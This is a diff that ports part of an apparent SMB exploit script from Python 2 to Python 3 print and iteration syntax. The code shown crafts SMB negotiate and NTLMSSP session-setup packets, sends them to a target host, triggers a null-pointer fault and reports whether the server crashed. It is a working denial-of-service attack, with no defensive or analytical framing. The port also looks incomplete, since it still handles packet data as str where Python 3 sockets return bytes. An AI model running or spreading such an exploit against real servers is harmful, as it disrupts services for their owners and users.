@@ -12,13 +12,13 @@ class Packet():
     ])
     def __init__(self, **kw):
         self.fields = OrderedDict(self.__class__.fields)
-        for k,v in kw.items():
+        for k,v in list(kw.items()):
             if callable(v):
                 self.fields[k] = v(self.fields[k])
             else:
                 self.fields[k] = v
     def __str__(self):
-        return "".join(map(str, self.fields.values()))
+        return "".join(map(str, list(self.fields.values())))
 
 class SMBHeader(Packet):
     fields = OrderedDict([
@@ -334,7 +334,7 @@ def SendCustomNego(Message):
     n = SMBNego(Data = SMBNegoData())
     n.calculate()
     packet0 = str(h)+str(n)
-    print Message
+    print(Message)
     return longueur(packet0)+packet0
 
 def handle(data,s):
@@ -347,7 +347,7 @@ def handle(data,s):
        final = t 
        packet1 = str(head)+str(final)
        buffer1 = longueur(packet1)+packet1  
-       print "[*]Using NT LM 0.12. Now Session Setup NTLMSSP Negotiate."
+       print("[*]Using NT LM 0.12. Now Session Setup NTLMSSP Negotiate.")
        s.send(buffer1)
 
     ##Session Setup AndX Request, NTLMSSP_AUTH, User: \
@@ -357,7 +357,7 @@ def handle(data,s):
        t.calculate()
        packet1 = str(head)+str(t)
        buffer1 = longueur(packet1)+packet1  
-       print "[*]Working..."
+       print("[*]Working...")
        s.send(buffer1)
        data = s.recv(1024)
        #Make sure it doesn't go in a loop.
@@ -365,17 +365,17 @@ def handle(data,s):
           s.close()
        #Triggered..
        if data[8:10] == "\x73\x05":
-          print "[*]Null PTR Triggered.\n[*]Waiting a bit, the process might be in a loop, Coup de Grace with the next few negotiate protocol."
+          print("[*]Null PTR Triggered.\n[*]Waiting a bit, the process might be in a loop, Coup de Grace with the next few negotiate protocol.")
           sleep(2)
           s.close()
     ##Bad userID on negotiate protocol, backend service crashed.
     if data[8:10] == "\x72\x01":
-       print "[*]Server crashed.\n[*]Quitting"
+       print("[*]Server crashed.\n[*]Quitting")
        sys.exit(1)
 
     ##Not Vulnerable.
     if data[8:10] == "\x73\xbb":
-       print "[!]This server is not vulnerable.\n[*]Quitting"
+       print("[!]This server is not vulnerable.\n[*]Quitting")
        sys.exit(1)
 
 def run(host):
@@ -388,7 +388,7 @@ def run(host):
        while True:
          data = s.recv(1024)
          if data == None:
-            print "[*]Server crashed.\n[*]Quitting"
+            print("[*]Server crashed.\n[*]Quitting")
          handle(data,s)
     except Exception:
          sleep(0.5)
